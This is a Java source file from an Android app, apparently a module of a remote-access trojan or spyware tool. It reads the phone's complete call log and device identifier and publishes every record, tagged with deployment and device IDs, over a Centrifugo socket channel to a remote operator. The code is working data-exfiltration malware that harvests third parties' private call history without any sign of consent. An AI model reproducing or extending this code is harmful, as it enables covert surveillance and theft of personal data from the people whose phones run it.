package com.gnu.cobat;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import io.github.centrifugal.centrifuge.Client;

public class CallsManager {

    public static JSONObject getCallsLogs(Client ioSocket){
        TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID = telephonyManager.getDeviceId();

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {

                try {
                    JSONObject call = new JSONObject();

                    for (int i = 0; i < cur.getColumnCount(); i++) {
                        try {
                            if (cur.getString(i) == null) {
                                call.put(cur.getColumnName(i), "");
                            }

                            String colName = cur.getColumnName(i);
                            if ( colName.equals("last_modified") || colName.equals("date") ) {
                                long val = Long.parseLong(cur.getString(i));
                                call.put(cur.getColumnName(i), val);
                            } else {
                                call.put(cur.getColumnName(i), cur.getString(i));
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    if ( call.getString("_id") != null ) {
                        call.put("original_id", call.getString("_id"));
                        call.remove("_id");
                    }
                    call.put("deploy_id", Global.deploy_id);
                    call.put("device_id", deviceID);
                    call.put("return", true);
                    call.put("return_type", "cb-call-log");

                    ioSocket.publish(Global.channel, call.toString().getBytes(), null);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            Calls.put("callsList", list);
            return Calls;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

}
